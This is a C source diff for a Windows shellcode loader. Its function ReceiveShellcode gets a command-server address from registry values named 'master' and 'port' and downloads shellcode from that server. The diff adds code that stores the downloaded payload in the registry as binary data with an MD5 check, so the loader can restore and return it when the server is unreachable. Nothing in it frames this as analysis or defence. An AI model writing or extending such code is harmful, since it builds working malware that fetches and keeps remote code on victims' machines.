@@ -91,6 +91,18 @@ int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
     return 0;
 }
 
+bool WriteRegistryString(const char* path, const char* keyName, const char* value) {
+	HKEY hKey;
+	LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+	if (result != ERROR_SUCCESS) {
+		return false;
+	}
+	result = RegSetValueExA(hKey,keyName,0,REG_SZ,(const BYTE*)value,(DWORD)(strlen(value) + 1));
+
+	RegCloseKey(hKey);
+	return result == ERROR_SUCCESS;
+}
+
 char* ReadRegistryString(const char* subKey, const char* valueName)
 {
     HKEY hKey = NULL;
@@ -114,6 +126,90 @@ char* ReadRegistryString(const char* subKey, const char* valueName)
     return data;
 }
 
+bool WriteAppSettingBinary(const char* path, const char* keyName, const void* data, DWORD dataSize) {
+	HKEY hKey;
+	LONG result = RegCreateKeyExA(HKEY_CURRENT_USER,path,0,NULL,0,KEY_WRITE,NULL,&hKey,NULL);
+	if (result != ERROR_SUCCESS) {
+		return false;
+	}
+    result = RegSetValueExA(hKey,keyName,0,REG_BINARY,(const BYTE*)data,dataSize);
+
+	RegCloseKey(hKey);
+	return result == ERROR_SUCCESS;
+}
+
+bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBuf, DWORD* dataSize) {
+	HKEY hKey;
+	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,path,0,KEY_READ,&hKey);
+	if (result != ERROR_SUCCESS) {
+		*dataSize = 0;
+		return false;
+	}
+
+	DWORD type = 0;
+	DWORD requiredSize = 0;
+	result = RegQueryValueExA(hKey,keyName,NULL,&type,NULL,&requiredSize);
+	if (result != ERROR_SUCCESS || type != REG_BINARY || requiredSize == 0 || requiredSize > *dataSize) {
+		*dataSize = 0;
+		RegCloseKey(hKey);
+		return false;
+	}
+
+	result = RegQueryValueExA(hKey,keyName,NULL,NULL,outDataBuf,&requiredSize);
+	RegCloseKey(hKey);
+	if (result == ERROR_SUCCESS) {
+		*dataSize = requiredSize;
+		return true;
+	}
+
+	*dataSize = 0;
+	return false;
+}
+
+#define MD5_DIGEST_LENGTH 16
+const char* CalcMD5FromBytes(const BYTE* data, DWORD length) {
+	static char md5String[MD5_DIGEST_LENGTH * 2 + 1]; // 32 hex chars + '\0'
+	if (data == NULL || length == 0) {
+		memset(md5String, 0, sizeof(md5String));
+		return md5String;
+	}
+	HCRYPTPROV hProv = 0;
+	HCRYPTHASH hHash = 0;
+	BYTE hash[MD5_DIGEST_LENGTH];
+	DWORD hashLen = sizeof(hash);
+
+	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+		return NULL;
+	}
+
+	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
+		CryptReleaseContext(hProv, 0);
+		return NULL;
+	}
+
+	if (!CryptHashData(hHash, data, length, 0)) {
+		CryptDestroyHash(hHash);
+		CryptReleaseContext(hProv, 0);
+		return NULL;
+	}
+
+	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
+		CryptDestroyHash(hHash);
+		CryptReleaseContext(hProv, 0);
+		return NULL;
+	}
+
+	// 转换为十六进制字符串
+	for (DWORD i = 0; i < hashLen; ++i) {
+		sprintf(&md5String[i * 2], "%02x", hash[i]);
+	}
+	md5String[MD5_DIGEST_LENGTH * 2] = '\0';
+
+	CryptDestroyHash(hHash);
+	CryptReleaseContext(hProv, 0);
+	return md5String;
+}
+
 const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
 {
     if (!sIP || !sizeOut) return NULL;
@@ -122,12 +218,14 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return NULL;
 
-    char addr[100] = { 0 };
+    char addr[100] = { 0 }, hash[33] = { 0 };
     strcpy(addr, sIP);
     const char* path = "Software\\ServerD11\\settings";
     char* saved_ip = ReadRegistryString(path, "master");
     char* saved_port = ReadRegistryString(path, "port");
     char* valid_to = ReadRegistryString(path, "valid_to");
+    char* md5 = ReadRegistryString(path, "version");
+    memcpy(hash, md5, md5 ? min(32, strlen(md5)) : 0);
     int now = time(NULL), valid = valid_to ? atoi(valid_to) : 0;
     if (now <= valid && saved_ip && *saved_ip && saved_port && *saved_port) {
         strcpy(addr, saved_ip);
@@ -139,6 +237,8 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
     saved_port = NULL;
     free(valid_to);
     valid_to = NULL;
+    free(md5);
+    md5 = NULL;
 
     char serverIP[INET_ADDRSTRLEN] = { 0 };
     if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
@@ -179,8 +279,9 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
             continue;
         }
 
-        char command[4] = { 210, sizeof(void*) == 8, 0, IsRelease };
+        char command[64] = { 210, sizeof(void*) == 8, 0, IsRelease, __DATE__ };
         char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
+        memcpy(command+32, hash, 32);
         PkgHeader h = MakePkgHeader(sizeof(command));
         memcpy(req, &h, sizeof(PkgHeader));
         memcpy(req + sizeof(PkgHeader), command, sizeof(command));
@@ -222,6 +323,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
         if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
             Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
             closesocket(clientSocket);
+            if (hash[0])break;
             continue;
         }
         unsigned char* ptr = buffer + sizeof(PkgHeader);
@@ -235,11 +337,26 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
         }
         closesocket(clientSocket);
         WSACleanup();
+        const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, size);
+        WriteAppSettingBinary(path, "data", buffer, 22 + size);
+        WriteRegistryString(path, "version", md5);
         return buffer;
     } while (1);
 
-    free(buffer);
     WSACleanup();
+    buffer = buffer ? buffer : (char*)malloc(bufSize);
+    DWORD binSize = bufSize;
+    if (ReadAppSettingBinary(path, "data", buffer, &binSize)) {
+        *sizeOut = binSize - 22;
+        const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, *sizeOut);
+        if (strcmp(md5, hash)==0) {
+			Mprintf("Read data from registry succeed: %d bytes\n", *sizeOut);
+			return buffer;
+        }
+    }
+    // Registry data is incorrect
+    WriteRegistryString(path, "version", "");
+    free(buffer);
     return NULL;
 }
 
